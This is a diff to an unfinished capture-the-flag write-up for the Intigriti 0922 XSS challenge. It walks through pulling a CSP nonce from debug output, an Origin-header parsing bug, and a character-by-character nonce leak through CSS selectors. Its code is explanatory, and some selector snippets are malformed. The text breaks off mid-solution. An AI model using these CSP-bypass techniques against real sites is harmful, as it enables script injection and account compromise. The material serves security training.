@@ -112,7 +112,41 @@ And providing an Array to
 
 In all three cases we seem to be getting some kind of debug output with lines
 from the actual php code that has a lot of base64 encoded stuff. 
-As that response is not going to be parsed correctly
+
+If you decode the base64 strings we will see it's a JSON object. In there we
+see a key with `csp' with the value of `46512fdd35b5ad382767954b3f0c6f1e`. We
+should remember this, it could potentially become useful later.
+```
+{
+  "atralObject": [
+    2204892,
+    623736226,
+    2142579215,
+    1966761445,
+    1519093412,
+    2112201876,
+    2028747074,
+    1792179292,
+    803288202,
+    789667990
+  ],
+  "csp": "46512fdd35b5ad382767954b3f0c6f1e",
+  "urandomConsistence": [
+    1243189873,
+    1884983223,
+    1794837626,
+    1695932971,
+    416092641,
+    1195114699,
+    2032810105,
+    1246950332,
+    1250924323,
+    960103501
+  ]
+}
+```
+
+As that response full of debug/trace output is not going to be parsed correctly
 into JSON. The `JSON.parse` call will throw an error and the whole response will get
 passed to `eval`.
 
@@ -365,7 +399,6 @@ We will do the latter.
   // window.i.contentWindow
   // window.frames[0]
   // i.contentWindow 
-  // or the shortest way
   // frames[0]
   // all now hold a window reference to the embedded page
 </script>
@@ -414,7 +447,7 @@ Here we try to `console.log` the `magic.php` iframe's location. See https://edit
   // i.contentwindow is the iframe right above
   // from that iframe we will have to select the the inner iframe of `magic.php`
   // that's how you get i.contentWindow.frames[0]
-  // or you could use just frames[0][0]
+  // or alternativly we could use just frames[0][0]
   run = e => console.log(i.contentWindow.frames[0].location.href)
 </script>
 ```
@@ -620,8 +653,112 @@ Refused to execute inline script because it violates the following Content Secur
 ```
 We forgot! As changing the `srcdoc` does not change any context, the CSP of `challenge-0922.intigriti.io`
 still is enforced! That effectively means the `script` block that holds our payload will need
-to have the correct `nonce` to be allowed to execute.
+to have the correct `nonce` to be allowed to execute. It will exactly need the
+nonce from the `<meta>` tag `script-src 'nonce-46512fdd35b5ad382767954b3f0c6f1e';`.
 
-So how on earth will we get the `nonce`?
+But how will our code get it's hand on the `nonce`? 
+Remember we saw it base64 encoded in the trace output of the api endpoint?
+Let's start there. What if we just request it by making a regular get request in
+javascript from a 3rd party domain like https://editor.43z.one/w4jss
+```
+<script>
+fetch("https://challenge-0922.intigriti.io/challenge/api.php?question=0")
+  .then(r => r.text())
+  .then(console.log)
+</script>
+```
+But this time the output is different and shorter then if when we opened `https://challenge-0922.intigriti.io/challenge/api.php?question=0`
+in the browser.
+
+```
+## Exception 'Question not found'
+
+#0 /dev/urandom(1388934387): setQuestion('"0"')
+#1 /dev/urandom(1218692528): initAnonConfig('5n1kq06kq0u4s7a399qqdcqnqh', 'W10=')
+#2 /dev/urandom(939716205): initAstralBall('eyJhbnN3ZXJzIjpbIkl0IGlzIGNlcnRhaW4iLCJXaXRob3V0IGEgZG91YnQiLCJEZWZpbml0ZWx5IiwiTW9zdCBsaWtlbHkiLCJPdXRsb29rIGdvb2QiLCJZZXMhIiwiVHJ5IGFnYWluIiwiUmVwbHkgaGF6eSIsIkNhbid0IHByZWRpY3QiLCJObyEiLCJVbmxpa2VseSIsIlNvdXJjZXMgc2F5IG5vIiwiVmVyeSBkb3VidGZ1bCJdfQ==', '"0"')
+#3 /var/www/html/api.php(18): require_once('/dev/urandom')
+```
+
+Before we got the `csp` from the base64 encoded data from the second parameter of `initAnonConfig`.
+But now it's just `W10=`, base64 decoded `[]` just an empty array.
+Looks like the `csp` or better the full javascript object was bound to a PHP session cookie.
+And by default `fetch()` does not include cookies in the request. That's why
+wee see 2 different outputs. 
+
+But according to the documentation of fetch it should send the correct cookies if
+we provide the object `{credentials: 'include'}` to it's function call.
+
+```
+<script>
+fetch("https://challenge-0922.intigriti.io/challenge/api.php?question=0", {
+  credentials: 'include'
+})
+  .then(r => r.text())
+  .then(console.log)
+</script>
+```
+Which will give you following error in the console
+```
+Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://challenge-0922.intigriti.io/challenge/api.php?question=0. (Reason: expected ‘true’ in CORS header ‘Access-Control-Allow-Credentials’).
+```
+Again we are getting blocked by the SOP. The server does not set a specific response header
+when we do the request from a origin other then `challenge-0922.intigriti.io` and 
+therefore the browser does not allow us to read the response. Bummer!
+
+NOTE: FROM HERE ON THE SOLUTION TO THE CHALLENGE WILL DIFFER FROM OTHERS WHO SOLVED IT.
+THERE IS A SERVER BUG WE MISSED, IN PARSING THE ORIGIN HEADER. THE SERVER WILL SET THE 
+NEEDED RESPONSE HEADER IF FOR EXAMPLE THE REQUEST WAS MADE FROM 
+`challenge-0922.intigriti.io.ATTACKER.COM`. THIS MEANS THE EXPLOIT JUST HAS TO 
+BE RUN FROM A SUBDOMAIN `challenge-0922.intigriti.io` WHICH WE WOULD CREATE
+ON ANY DOMAIN WE OWN.
+
+As requesting the api didn't work as we liked, what else is there left? 
+The nonce is obviously reflected in the page `index.php` a few times. 
+Once in the actual `<meta>` tag and two times as attribute of `<script>` tags. 
+
+We could use CSS selectors with the `document.querySelectorAll` from
+
+```
+case 'set':
+  [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
+  break;
+```
+and extract the nonce one character at a time. Let's look at this example.
+
+```
+<script nonce="bcdef"></script>
+<script>
+  console.log(document.querySelectorAll('script[nonce^"=a"]'))
+</script>
+```
+This would log an empty array as there is not `script` with a attribute `nonce`
+that starts with `a`. We could use this method of iteration until we have the full
+nonce.
+```
+<script nonce="bcdef"></script>
+<script>
+  console.log(document.querySelectorAll('script[nonce^"=b"]'))   // finds script tag
+  console.log(document.querySelectorAll('script[nonce^"=ba"]'))  // empty array
+  console.log(document.querySelectorAll('script[nonce^"=bb"]'))  // empty array
+  console.log(document.querySelectorAll('script[nonce^"=bc"]'))  // finds script tag
+  console.log(document.querySelectorAll('script[nonce^"=bca"]')) // empty array
+  console.log(document.querySelectorAll('script[nonce^"=bcb"]')) // empty array
+  console.log(document.querySelectorAll('script[nonce^"=bcc"]')) // empty array
+  console.log(document.querySelectorAll('script[nonce^"=bcd"]')) // finds script tag
+</script>
+```
+Great! We can sent these actions from our blobbed script to `index.php`.
+But how do we know which of the nonces we sent mached. We need some way of 
+communicating back to the iframe that what we sent was correct, so we can keep building
+the correct nonce and keep adding charachters. And whatever this mechanism is it
+can only involve running `s.setAttribute()`. Because that's all we can utilize from
+
+```
+document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value)
+```
+
+It iterates through the result array them and sets a attribute on every.
+This is great we could use 
+
 
 NOT YET FINISHED
